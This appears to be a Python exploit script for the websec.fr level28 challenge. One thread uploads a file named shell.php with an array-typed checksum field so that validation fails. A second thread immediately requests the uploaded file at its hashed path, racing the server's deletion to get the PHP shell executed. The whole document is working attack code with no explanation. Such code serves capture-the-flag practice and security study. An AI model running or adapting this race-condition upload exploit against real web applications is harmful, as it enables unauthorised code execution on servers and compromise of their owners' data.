import time
import requests
import threading

def one():

    url = 'http://websec.fr/level28/index.php'
    files = {'flag_file': open('shell.php', 'rb')}
    data = {'checksum[]':'f', 'submit':'Upload and check'}
    
    start = time.time()
    response = requests.post(url, files=files, data=data)
    end = time.time()
    
    print('one', start, end, response.status_code)


def two():

    url = 'http://websec.fr/level28/f3959b484667e8ab56a4e0cafba2b430.php'
    
    start = time.time()
    response = requests.get(url)
    end = time.time()
    
    print('two', start, end, response.status_code)

t1 = threading.Thread(target=one)
t2 = threading.Thread(target=two)

t1.start()
time.sleep(1.0)
t2.start()

